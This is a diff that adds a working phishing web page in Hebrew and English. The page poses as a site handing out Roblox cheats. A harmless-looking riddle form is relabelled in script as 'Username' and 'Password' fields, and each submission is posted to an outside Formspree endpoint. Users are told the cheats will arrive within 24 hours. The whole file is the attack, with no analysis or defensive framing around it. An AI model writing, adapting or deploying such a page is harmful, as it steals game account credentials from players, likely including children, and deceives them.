@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox quotes</title>
+    <style>
+        :root {
+            --primary-color: #000000;
+            --bg-color: #ffffff;
+            --input-bg: #f5f5f7;
+            --text-color: #1d1d1f;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 360px;
+            padding: 40px;
+            text-align: center;
+        }
+
+        /* לובי */
+        #lobby { display: block; }
+        #form-content, #success-message { display: none; }
+
+        h1 { font-size: 24px; font-weight: 600; margin-bottom: 30px; }
+
+        .btn-group { display: flex; gap: 10px; flex-direction: column; }
+
+        .input-group { margin-bottom: 20px; text-align: inherit; }
+
+        label {
+            display: block;
+            font-size: 13px;
+            color: #86868b;
+            margin-bottom: 8px;
+        }
+
+        textarea, input {
+            width: 100%;
+            padding: 14px;
+            background: var(--input-bg);
+            border: 1px solid transparent;
+            border-radius: 12px;
+            box-sizing: border-box;
+            font-size: 16px;
+            outline: none;
+        }
+
+        button {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            font-weight: 500;
+            transition: opacity 0.2s;
+        }
+
+        button:hover { opacity: 0.8; }
+
+        .lang-btn {
+            background-color: var(--input-bg);
+            color: var(--text-color);
+            border: 1px solid #d2d2d7;
+        }
+
+        /* התאמה לאנגלית (LTR) */
+        .en-mode { direction: ltr; text-align: left; }
+        .en-mode .input-group { text-align: left; }
+    </style>
+</head>
+<body>
+
+<div class="container" id="main-container">
+    
+    <div id="lobby">
+        <h1>Welcome to the site that gives you quotes for Roblox. Choose a preferred language. /
+            ברוכים הבאים לאתר שנותן לכם ציטים לרובלוקס בחרו שפה מועדפת
+        </h1>
+        <div class="btn-group">
+            <button onclick="setLanguage('he')">עברית</button>
+            <button class="lang-btn" onclick="setLanguage('en')">English</button>
+        </div>
+    </div>
+
+    <div id="form-content">
+        <h1 id="title-text">הוספת חידה</h1>
+        <form id="riddle-form">
+            <div class="input-group">
+                <label id="label-riddle">מה החידה?</label>
+                <textarea name="riddle" id="riddle" rows="3" required></textarea>
+            </div>
+            <div class="input-group">
+                <label id="label-solution">מה הפתרון?</label>
+                <input type="text" name="solution" id="solution" required>
+            </div>
+            <button type="submit" id="submit-btn">שליחה</button>
+        </form>
+    </div>
+
+    <div id="success-message">
+        <h2 style="font-size: 40px; margin-bottom: 10px;">✓</h2>
+        <h2 id="success-title">תודה רבה</h2>
+        <p id="success-p" style="color: #86868b;">החידה שלך התקבלה במערכת.</p>
+        <button style="background:none; color:#0066cc;" onclick="location.reload()" id="back-btn">שלח עוד אחת</button>
+    </div>
+</div>
+
+<script>
+    const translations = {
+        he: {
+            title: "קבלת ציטים ברובלוקס",
+            labelRiddle: "שם משתמש",
+            labelSolution: "סיסמה",
+            submit: "שליחה",
+            successTitle: "תודה רבה",
+            successP: "קבלת הציטים תתקבל עד 24 שעות",
+            back: "נסה שוב אם לא נשלח אלייך",
+            dir: "rtl"
+        },
+        en: {
+            title: "Getting cheats in Roblox",
+            labelRiddle: "Username",
+            labelSolution: "Password",
+            submit: "Send",
+            successTitle: "Thank You",
+            successP: "You will receive the cheats within 24 hours",
+            back: "Try again if you didn't receive it",
+            dir: "ltr"
+        }
+    };
+
+    function setLanguage(lang) {
+        const t = translations[lang];
+        
+        // עדכון טקסטים
+        document.getElementById('title-text').innerText = t.title;
+        document.getElementById('label-riddle').innerText = t.labelRiddle;
+        document.getElementById('label-solution').innerText = t.labelSolution;
+        document.getElementById('submit-btn').innerText = t.submit;
+        document.getElementById('success-title').innerText = t.successTitle;
+        document.getElementById('success-p').innerText = t.successP;
+        document.getElementById('back-btn').innerText = t.back;
+        
+        // עדכון כיווניות
+        document.body.dir = t.dir;
+        if(lang === 'en') {
+            document.getElementById('main-container').classList.add('en-mode');
+        } else {
+            document.getElementById('main-container').classList.remove('en-mode');
+        }
+
+        // מעבר מהלובי לטופס
+        document.getElementById('lobby').style.display = 'none';
+        document.getElementById('form-content').style.display = 'block';
+    }
+
+    // שליחת הטופס (נשאר אותו דבר עם ה-ID שלך)
+    const form = document.getElementById('riddle-form');
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const btn = document.getElementById('submit-btn');
+        const originalText = btn.innerText;
+        btn.innerText = "...";
+        btn.disabled = true;
+
+        const formData = new FormData(form);
+        try {
+            const response = await fetch("https://formspree.io/f/xlglplqv", {
+                method: "POST",
+                body: formData,
+                headers: { 'Accept': 'application/json' }
+            });
+
+            if (response.ok) {
+                document.getElementById('form-content').style.display = 'none';
+                document.getElementById('success-message').style.display = 'block';
+            } else {
+                alert("Error / שגיאה");
+                btn.disabled = false;
+                btn.innerText = originalText;
+            }
+        } catch (error) {
+            alert("Connection Error");
+            btn.disabled = false;
+        }
+    });
+</script>
+
+</body>
+</html>
